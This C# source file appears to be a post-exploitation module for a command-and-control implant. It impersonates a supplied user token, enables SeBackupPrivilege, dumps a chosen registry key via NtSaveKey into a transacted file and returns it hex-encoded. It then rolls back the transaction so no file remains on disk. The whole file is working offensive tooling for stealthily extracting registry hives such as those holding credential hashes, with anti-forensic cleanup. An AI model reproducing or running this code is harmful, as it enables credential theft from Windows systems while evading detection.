using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.Diagnostics;


public class Module_reg_dump_trans
{
    public const string SUCC_CODE        = "0";
    public const string ERR_CODE         = "1";
    public const string NON_TOKEN_VALUE  = "0";
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

    private const int KEY_ALL_ACCESS         = 0xF003F;
    private const int KEY_CREATE_LINK        = 0x0020;
    private const int KEY_CREATE_SUB_KEY     = 0x0004;
    private const int KEY_ENUMERATE_SUB_KEYS = 0x0008;
    private const int KEY_EXECUTE            = 0x20019;
    private const int KEY_NOTIFY             = 0x0010;
    private const int KEY_QUERY_VALUE        = 0x0001;
    private const int KEY_READ               = 0x20019;
    private const int KEY_SET_VALUE          = 0x0002;
    private const int KEY_WOW64_32KEY        = 0x0200;
    private const int KEY_WOW64_64KEY        = 0x0100;
    private const int KEY_WRITE              = 0x20006;

    private const int ERROR_SUCCESS = 0x0;

    private const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;
    private const UInt32 SE_PRIVILEGE_ENABLED            = 0x00000002;
    private const UInt32 SE_PRIVILEGE_REMOVED            = 0x00000004;
    private const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS    = 0x80000000;

    public enum ROOT_KEY : uint
    {
        HKEY_CLASSES_ROOT      = 0x80000000,
        HKEY_CURRENT_USER      = 0x80000001,
        HKEY_LOCAL_MACHINE     = 0x80000002,
        HKEY_USERS             = 0x80000003,
        HKEY_PERFORMANCE_DATA  = 0x80000004,
        HKEY_CURRENT_CONFIG    = 0x80000005,
        HKEY_DYN_DATA          = 0x80000006
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public int lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public UInt32 LowPart;
        public Int32 HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public UInt32 Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public int PrivilegeCount;
        
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PRIVILEGE_SET
    {
        public uint PrivilegeCount;
        public uint Control;

        public static uint PRIVILEGE_SET_ALL_NECESSARY = 1;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privilege;
    }

    [DllImport("advapi32.dll", EntryPoint = "RegOpenKeyExW", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int RegOpenKeyEx(
        ROOT_KEY hKey,
        [MarshalAs(UnmanagedType.LPWStr)] string subKey,
        int options,
        int samDesired,
        ref UIntPtr phkResult);

    [DllImport("ntdll.dll", EntryPoint = "NtSaveKey", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern Int32 NtSaveKey(
        UIntPtr hKey,
        UIntPtr fileHandle);

    [DllImport("ktmw32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern System.IntPtr CreateTransaction(
        IntPtr lpTransactionAttributes,
        IntPtr UOW,
        int CreateOptions,
        int IsolationLevel,
        int IsolationFlags,
        int Timeout,
        [MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder Description);

    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern UIntPtr CreateFileTransactedW(
        [MarshalAs(UnmanagedType.LPWStr)] string lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile,
        IntPtr hTransaction,
        ref ushort pusMiniVersion,
        IntPtr nullValue);

    [DllImport("ktmw32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool RollbackTransaction(IntPtr lpTransaction);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,
        [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        UInt32 BufferLengthInBytes,
        ref TOKEN_PRIVILEGES PreviousState,
        out UInt32 ReturnLengthInBytes);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool LookupPrivilegeValue(
        string lpSystemName,
        string lpName,
        out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool PrivilegeCheck(
        IntPtr ClientToken,
        ref PRIVILEGE_SET RequiredPrivileges,
        out bool pfResult
        );

    [DllImport("kernel32.dll")]
    private static extern bool GetFileSizeEx(
        UIntPtr hFile,
        out long lpFileSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateFileMapping(
        UIntPtr hFile,
        IntPtr lpFileMappingAttributes,
        uint flProtect,
        uint dwMaximumSizeHigh,
        uint dwMaximumSizeLow,
        string lpName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr MapViewOfFile(
        IntPtr hFileMappingObject,
        uint dwDesiredAccess,
        uint dwFileOffsetHigh,
        uint dwFileOffsetLow,
        IntPtr dwNumberOfBytesToMap);

    [DllImport("kernel32.dll", SetLastError=true)]
    private static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenThreadToken(
        IntPtr ThreadHandle,
        TokenAccessLevels DesiredAccess,
        bool OpenAsSelf,
        out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetCurrentThread();

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        TokenAccessLevels DesiredAccess,
        out IntPtr TokenHandle
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);

    private string ByteArrayToString(byte[] ba)
    {
        StringBuilder hex = new StringBuilder(ba.Length * 2);
        foreach (byte b in ba)
            hex.AppendFormat("{0:x2}", b);
        return hex.ToString();
    }

    private bool IsPrivilegeEnabled(IntPtr hToken, string PrivilegeName)
    {
        bool privAssigned = false;
        LUID luid = new LUID();
        if (!LookupPrivilegeValue(null, PrivilegeName, out luid))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("LookupPrivilegeValue failed with the following error: " + errorCode);
        }
        
        PRIVILEGE_SET privs = new PRIVILEGE_SET();
        privs.Privilege = new LUID_AND_ATTRIBUTES[1];
        privs.Control = PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY;
        privs.PrivilegeCount = 1;
        privs.Privilege[0].Luid = luid;
        privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        if (!PrivilegeCheck(hToken, ref privs, out privAssigned))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("PrivilegeCheck failed with the following error: " + errorCode);
        }
        
        return privAssigned;
    }

    private void EnablePrivilege(IntPtr hToken, string PrivilegeName)
    {
        LUID luid = new LUID();
        
        if (!LookupPrivilegeValue(null, PrivilegeName, out luid))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("LookupPrivilegeValue failed with the following error: " + errorCode);
        }
        
        LUID_AND_ATTRIBUTES luAttr = new LUID_AND_ATTRIBUTES();
        luAttr.Luid = luid;
        luAttr.Attributes = SE_PRIVILEGE_ENABLED;
        
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Privileges = new LUID_AND_ATTRIBUTES[1];
        tp.Privileges[0] = luAttr;
        
        TOKEN_PRIVILEGES oldState = new TOKEN_PRIVILEGES();
        UInt32 returnLength = 0;
        
        if (!AdjustTokenPrivileges(hToken, false, ref tp, 256, ref oldState, out returnLength))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("AdjustTokenPrivileges failed with the following error: " + errorCode);
        }        
    }

    private string getRandomName(Random rand)
    {
        string seedVals = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        char[] stringChars = new char[8];
        for (int i = 0; i < stringChars.Length; i++)
        {
            stringChars[i] = seedVals[rand.Next(seedVals.Length)];
        }
        return new string(stringChars);
    }

    private IntPtr GetCurrentProcessToken()
    {
        IntPtr currTkn = IntPtr.Zero;
        Process currProc = Process.GetCurrentProcess();
        IntPtr currProcHandle = currProc.Handle;
        if (!OpenProcessToken(currProcHandle, TokenAccessLevels.AdjustPrivileges | TokenAccessLevels.Query, out currTkn))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("OpenProcessToken failed with the following error: " + errorCode);
        }
        return currTkn;
    }

    private IntPtr GetCurrentThreadToken()
    {
        IntPtr currTkn = IntPtr.Zero;
        if (!OpenThreadToken(GetCurrentThread(), TokenAccessLevels.AdjustPrivileges | TokenAccessLevels.Query, false, out currTkn))
            return IntPtr.Zero;        
        return currTkn;
    }

    private IntPtr GetCurrentToken()
    {
        IntPtr ctToken = IntPtr.Zero;
        
        ctToken = GetCurrentThreadToken();
        if (ctToken == IntPtr.Zero)
            ctToken = GetCurrentProcessToken();

        if (ctToken == IntPtr.Zero)
            throw new Exception("GetCurrentThreadToken and GetCurrentProcessToken failed");

        return ctToken;
    }

    private string[] doRegDumpTrans(string rootKey, string subKey)
    {
        string result = "";

        try
        {
            ROOT_KEY rKey;
            switch (rootKey)
            {
                case "HKEY_CLASSES_ROOT":
                    rKey = ROOT_KEY.HKEY_CLASSES_ROOT;
                    break;
                case "HKEY_CURRENT_USER":
                    rKey = ROOT_KEY.HKEY_CURRENT_USER;
                    break;
                case "HKEY_LOCAL_MACHINE":
                    rKey = ROOT_KEY.HKEY_LOCAL_MACHINE;
                    break;
                case "HKEY_USERS":
                    rKey = ROOT_KEY.HKEY_USERS;
                    break;
                case "HKEY_PERFORMANCE_DATA":
                    rKey = ROOT_KEY.HKEY_PERFORMANCE_DATA;
                    break;
                case "HKEY_CURRENT_CONFIG":
                    rKey = ROOT_KEY.HKEY_CURRENT_CONFIG;
                    break;
                case "HKEY_DYN_DATA":
                    rKey = ROOT_KEY.HKEY_DYN_DATA;
                    break;
                default:
                    throw new Exception("Invalid root key: '" + rootKey + "'");
            }

            UIntPtr hKey = UIntPtr.Zero;
            SECURITY_ATTRIBUTES tSecAttrib = new SECURITY_ATTRIBUTES();
            tSecAttrib.nLength = Marshal.SizeOf(tSecAttrib);
            tSecAttrib.lpSecurityDescriptor = 0;
            tSecAttrib.bInheritHandle = true;
            IntPtr transactionHandle = IntPtr.Zero;
            IntPtr lpTransactionAttributes = IntPtr.Zero;
            IntPtr UOW = IntPtr.Zero;
            int CreateOptions = 0;
            int IsolationLevel = 0;
            int IsolationFlags = 0;
            int Timeout = 0;
            Random rand = new Random();
            StringBuilder Description = new StringBuilder(getRandomName(rand));
            UIntPtr createFileHandle;
            ushort miniVersion = 0xffff;
            long fileSize;
            IntPtr mapping, mapview;
            
            IntPtr ctToken = GetCurrentToken();

            EnablePrivilege(ctToken, "SeBackupPrivilege");

            if (!IsPrivilegeEnabled(ctToken, "SeBackupPrivilege"))
                throw new Exception("Can not assign SeBackupPrivilege to Current Token");
            
            if (RegOpenKeyEx(rKey, subKey, 0, KEY_READ, ref hKey) != ERROR_SUCCESS)
                throw new Exception("Can not open subkey: '" + subKey + "'");

            transactionHandle = CreateTransaction(lpTransactionAttributes, UOW, CreateOptions, IsolationLevel, IsolationFlags, Timeout, Description);
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            path = path + string.Format(@"\{0}.log", getRandomName(rand));
            createFileHandle = CreateFileTransactedW(path, 0x80000000 | 0x40000000, 0x00000002, IntPtr.Zero, 0x00000001, 0x100 | 0x04000000, IntPtr.Zero, transactionHandle, ref miniVersion, IntPtr.Zero);
            int a = NtSaveKey(hKey, createFileHandle);
            GetFileSizeEx(createFileHandle, out fileSize);
            mapping = CreateFileMapping(createFileHandle, IntPtr.Zero, 0x2, 0, 0, "");
            mapview = MapViewOfFile(mapping, 0x4, 0, 0, IntPtr.Zero);
            
            byte[] content = new byte[fileSize];
            Marshal.Copy(mapview, content, 0, (int)fileSize);
            result += ByteArrayToString(content);
            
            UnmapViewOfFile(mapview);
            RollbackTransaction(transactionHandle);
            CloseHandle(mapping);
            CloseHandle(transactionHandle);
        }
        catch (Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return new string[]{SUCC_CODE, result};
    }

    public string[] execute(string[] args)
    {
        string result = "";
        List<string> nargs = new List<string>(args);

        if (nargs.Count != 2)
        {
            result = "Invalid arguments provided. Specify a root key and registry key to be extracted" + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return doRegDumpTrans(nargs[0], nargs[1]);
    }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void go_dm(string cwd, string args, string token)
    {
        Module_reg_dump_trans m = new Module_reg_dump_trans();
        String[] results = m.go(cwd, args, token);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }

    public static void Main(string[] args)
    {
        Module_reg_dump_trans m = new Module_reg_dump_trans();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}